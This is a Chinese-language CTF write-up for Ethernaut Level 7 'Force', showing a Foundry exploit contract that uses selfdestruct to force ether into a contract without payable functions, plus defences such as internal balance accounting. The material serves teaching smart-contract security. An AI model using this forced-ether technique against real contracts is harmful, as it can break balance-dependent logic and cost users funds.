---
title: 'Ethernaut Level 7: Force - 强制发送以太币攻击'
date: 2025-01-25 15:20:00
updated: 2025-01-25 15:20:00
categories:
  - Ethernaut 系列
  - 基础攻击篇 (1-10)
tags:
  - Ethernaut
  - Foundry
  - selfdestruct
  - 强制转账
  - 合约余额
  - 智能合约安全
  - Solidity
series: Ethernaut Foundry Solutions
excerpt: "学习如何使用 selfdestruct 强制向合约发送以太币，理解合约余额检查的安全隐患。"
---

# 🎯 Ethernaut Level 7: Force - 强制发送以太币攻击

> **关卡链接**: [Ethernaut Level 7 - Force](https://ethernaut.openzeppelin.com/level/7)  
> **攻击类型**: 强制转账、selfdestruct 利用  
> **难度**: ⭐⭐☆☆☆

## 📋 挑战目标

1. **向合约发送以太币** - 让 `Force` 合约的余额大于 0
2. **绕过接收限制** - 合约没有 payable 函数或 fallback

## 🔍 漏洞分析

### 合约源码分析

```solidity
pragma solidity ^0.8.0;

contract Force {/*
                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)
*/}
```

**关键问题**：
- 合约完全空白，没有任何函数
- 没有 `payable` 函数或 `fallback/receive` 函数
- 正常情况下无法接收以太币

### 强制发送以太币的方法

尽管合约拒绝接收以太币，但有几种方法可以强制发送：

1. **selfdestruct()** - 合约自毁时强制转移余额 ⭐
2. **预计算地址挖矿** - 向未来地址预先发送以太币
3. **Coinbase 奖励** - 作为矿工奖励接收地址

## 💻 Foundry 实现

### 攻击合约代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// 目标合约 - 完全空白
contract Force {
    // 空合约，无法正常接收以太币
}

contract ForceAttacker {
    constructor() payable {
        // 构造函数接收以太币
    }
    
    function attack(address payable target) public {
        // 🎯 关键攻击：使用 selfdestruct 强制发送以太币
        selfdestruct(target);
    }
}

contract ForceTest is Test {
    Force public force;
    ForceAttacker public attacker;
    
    address public user = makeAddr("user");

    function setUp() public {
        // 部署 Force 合约
        force = new Force();
        
        // 给用户一些以太币
        vm.deal(user, 10 ether);
    }

    function testForceExploit() public {
        console.log("=== 攻击前状态 ===");
        console.log("Force 合约余额:", address(force).balance);
        
        vm.startPrank(user);
        
        // 部署攻击合约并发送以太币
        attacker = new ForceAttacker{value: 1 ether}();
        
        console.log("攻击合约余额:", address(attacker).balance);
        
        // 🎯 执行攻击：自毁并强制发送以太币
        attacker.attack(payable(address(force)));
        
        vm.stopPrank();
        
        console.log("=== 攻击后状态 ===");
        console.log("Force 合约余额:", address(force).balance);
        console.log("攻击合约余额:", address(attacker).balance);
        
        // 验证攻击成功
        assertGt(address(force).balance, 0);
        console.log("攻击成功！Force 合约现在有以太币了");
    }
    
    function testNormalTransferFails() public {
        vm.startPrank(user);
        
        // 尝试正常发送以太币 - 应该失败
        (bool success,) = address(force).call{value: 1 ether}("");
        assertFalse(success);
        
        console.log("正常转账失败，如预期");
        assertEq(address(force).balance, 0);
        
        vm.stopPrank();
    }
    
    function testPreComputedAddress() public {
        // 演示预计算地址方法
        address futureAddress = computeCreateAddress(user, vm.getNonce(user) + 1);
        
        vm.startPrank(user);
        
        // 向未来地址发送以太币
        (bool success,) = futureAddress.call{value: 1 ether}("");
        assertFalse(success); // 地址不存在，发送失败
        
        console.log("预计算地址:", futureAddress);
        
        vm.stopPrank();
    }
}
```

### 其他强制发送方法

```solidity
contract AlternativeAttacks {
    // 方法 2: 预计算地址 (实际中很难实现)
    function preComputedAttack() public payable {
        // 1. 计算目标合约的未来部署地址
        // 2. 向该地址发送以太币
        // 3. 在该地址部署目标合约
        // 注意：这需要控制部署时机，实际中很困难
    }
    
    // 方法 3: 作为矿工设置 coinbase (仅理论上可能)
    function coinbaseAttack() public {
        // 如果你是矿工，可以将目标地址设为 coinbase
        // 挖矿奖励会直接发送到该地址
        // 但这需要巨大的算力投入
    }
}
```

## 🛡️ 防御措施

### 1. 避免依赖合约余额进行逻辑判断

```solidity
contract VulnerableContract {
    // ❌ 危险：依赖合约余额
    function withdraw() public {
        require(address(this).balance == 0, "Contract must be empty");
        // 可被 selfdestruct 攻击绕过
    }
}

contract SafeContract {
    uint256 private internalBalance;
    
    // ✅ 安全：使用内部记账
    function deposit() public payable {
        internalBalance += msg.value;
    }
    
    function withdraw() public {
        require(internalBalance == 0, "Internal balance must be zero");
        // 无法被外部强制修改
    }
}
```

### 2. 使用内部状态变量

```solidity
contract SecureForce {
    uint256 private receivedAmount;
    
    receive() external payable {
        receivedAmount += msg.value;
    }
    
    function getReceivedAmount() public view returns (uint256) {
        return receivedAmount; // 只计算主动接收的以太币
    }
    
    function getTotalBalance() public view returns (uint256) {
        return address(this).balance; // 包括强制发送的以太币
    }
}
```

### 3. 检查余额变化

```solidity
contract BalanceMonitor {
    uint256 private lastKnownBalance;
    
    modifier balanceCheck() {
        uint256 balanceBefore = address(this).balance;
        _;
        uint256 balanceAfter = address(this).balance;
        
        // 检测意外的余额变化
        if (balanceAfter != lastKnownBalance) {
            emit UnexpectedBalanceChange(lastKnownBalance, balanceAfter);
        }
        
        lastKnownBalance = balanceAfter;
    }
    
    event UnexpectedBalanceChange(uint256 expected, uint256 actual);
}
```

## 📚 核心知识点

### selfdestruct 机制

```solidity
contract SelfDestructExample {
    constructor() payable {}
    
    function destroy(address payable recipient) public {
        // selfdestruct 会：
        // 1. 销毁合约代码
        // 2. 将所有以太币发送给 recipient
        // 3. 强制发送，无法被阻止
        selfdestruct(recipient);
    }
}
```

### 合约接收以太币的方式

| 方式 | 可被阻止 | 说明 |
|------|----------|------|
| **正常转账** | ✅ 是 | 需要 payable 函数 |
| **selfdestruct** | ❌ 否 | 强制发送，无法拒绝 |
| **预计算地址** | ❌ 否 | 发送到未来地址 |
| **矿工奖励** | ❌ 否 | Coinbase 奖励 |

### 安全编程最佳实践

```solidity
// ❌ 不安全的模式
contract BadPattern {
    function criticalFunction() public {
        require(address(this).balance == 0, "Must be empty");
        // 逻辑...
    }
}

// ✅ 安全的模式  
contract GoodPattern {
    uint256 private expectedBalance;
    
    function criticalFunction() public {
        require(expectedBalance == 0, "Expected balance must be zero");
        // 逻辑...
    }
    
    function updateExpectedBalance(uint256 amount) private {
        expectedBalance = amount;
    }
}
```

## 🎯 总结

Force 关卡教导了重要的以太币处理原则：

- ✅ **永远不要依赖 `address(this).balance`** - 可以被强制修改
- ✅ **使用内部状态跟踪余额** - 更加安全可靠
- ✅ **理解 selfdestruct 的强制性** - 无法被合约拒绝
- ✅ **设计时考虑意外资金** - 处理非预期的以太币

这个看似简单的攻击揭示了以太坊虚拟机层面的重要特性。

---

## 🔗 相关链接

- **[上一关: Level 6 - Delegation](/2025/01/25/ethernaut-level-06-delegation/)**
- **[下一关: Level 8 - Vault](/2025/01/25/ethernaut-level-08-vault/)**
- **[系列目录: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**
- **[GitHub 项目](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**